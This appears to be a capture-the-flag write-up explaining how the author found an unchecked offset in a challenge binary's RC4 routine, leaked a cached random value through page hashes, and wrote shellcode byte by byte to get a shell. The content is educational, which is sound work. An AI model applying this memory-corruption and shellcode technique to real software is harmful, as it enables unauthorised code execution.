### Understanding the code
There are about 850 lines of C source code to read through and label (*decompiled with ghidra*) so this task takes a lot of persistence to find the bug, especially for those that aren't experienced with reading C source.

Without the ability to rename variables and define structs in Ghidra, this task would've been significantly harder, simply because it's so difficult to keep track of everything. So getting familiar with Ghidra's keyboard shortcuts, especially those for forward and back navigation, adding comments, and variable renaming, really helped me with efficiency.

#### The init function

This function runs **before** main, it's effectively passed into `__libc_start_main`, which then handles running it.
```c
  __libc_start_main(main, local1, &local2, run_init_functions, 
                    FUN_001024f0, uParm3, auStack8);
```

It does a couple weird things. It `malloc`s `0x50,001,000` of memory, which is significantly larger than the heap (`0x21,000`), so the memory gets mapped to a larger region between the heap and dynamic libraries on my system.

It then splits the allocated space up into 10 regions, each of which have `rwx` memory for the first `0x8000` bytes and `rw` for the rest.

#### The commands

The application allows you to create and run "trustlets". Each trustlet is basically an object that contains some predefined functions (we will change that). The functions depend on the trustlet's "type", which you select when adding it with the `l` command. After creating it, you can execute the functions for each trustlet with the `c` command.

Each trustlet gets two functions copied into its `rwx` memory region. The first function resides at offset `+0x0000` and the second at `+0x4000`.

- type 0
  -  `+0x0000` a rather useless function that flips `0x00` bytes to `0x01` on the stack. Not much use for us. The stack isn't executable anyway.
  - `+0x4000` a function that [murmur hashes](https://en.wikipedia.org/wiki/MurmurHash) every page (`0x1000` bytes) of the trustlet and prints the hashes.
    > Googling some of the constants in the function lead us to the murmur hash wiki page.
 - type 1
   - `+0x0000` a function that reads in up to `0x40` bytes of data from stdin, encrypts it using [rc4](https://en.wikipedia.org/wiki/RC4), writes the encrypted data to a random page and user provided page offset, then prints the encrypted data.
   - `+0x4000` another *seemingly useless* function.

### The vulnerability
The rc4 encryption function that's associated with type 1 trustlets does not validate the size of the `data offset` variable it reads from stdin. You can use this to write to arbitrary memory addresses, meaning that we can modify the code for a particular trustlet, execute that code and get a shell.

The outline of the rc4 function is roughly:

1. Randomly select a page in the current trustlet's `rw` memory region. 
    ```c
    rand_page = trustlet->rw_memory + random_number*PAGE_SIZE
    ```
   where `0 < random_number < 0x7ff7`. This restriction keeps `rand_page` constrained to the current trustlet.
2. Write the user input to `rand_page`
3. Encrypt the user input with a random key
4. Write the encrypted user input to `rand_page + 0x40`
5. Write the encrypted user input to `rand_page + 0x40 + data_offset`
6. Print the encrypted user input

By varying the `data_offset` input, we can write to regions outside of the current trustlet, or even to code within the current trustlet

There are two issues here

1. Because of `random_number`, the exact location of the out of bounds write can vary drastically, i.e., in a range of `+0x0` to `+0x7,ff7,000`.
2. The out of bounds write happens with encrypted data, so we can't control what exactly gets written.

### The exploit

#### Leaking the `random_number`
Prior to calling the rc4 encryption function, the code will read and **cache** a random number from `/dev/random`. There is a global `int array[10]` that caches the random numbers for each trustlet.

So if we can determine the cached `random_number`, we can use it together with the unchecked `data_offset` to write to memory of our choice.

Rough outline:

1. Hash all the pages of a type 0 trustlet and save the result
2. Call the rc4 encryption function of an adjacent type 1 trustlet with `data_offset=+/-0x8,000,000`. `+/-` depending on if you created the type 0 trustlet before or after the type 1 trustlet. `0x8,000,000` because that's how much memory is `malloc`'d for each trustlet.
3. Hash all the pages of the type 0 trustlet again
4. Compare the two lists of hashes and find the index of the differing hash

The differing hash corresponds to the page that was modified and the `random_number`.

#### Writing the shellcode

The `rwx` region of memory for all other trustlets is set to `r-x` while the current trustlet executes, meaning that you can't modify code for other trustlets, but you can modify the code for the current trustlet!

So we can overwrite the other seemingly useless function that comes with type 1 trustlets with our shellcode, then simply execute that function.

With the knowledge of `random_number`, we can now write to precise memory locations, so the rough outline is:
```python
for byte in shellcode:
    while byte != write_random_byte(byte):
        pass
```
where we write one byte of the shellcode at a time, randomly, with a 1/256 chance of getting it right on each attempt.


### Beating the 20 minute alarm

Running the exploit against my local binary was fast. Even with `pwntools` default 48 byte long shellcode `shellcraft.amd64.sh()`, but over the network it would've taken an hour on my connection.

The quick solution: run a ping test on their server from several locations around the world to find the place with the shortest latency.

Log into your cloud provider, start up an instance in Paris, and you've got up to a factor of 60 speed up. For me this was enough to bring the run time down to 5-10 minutes.
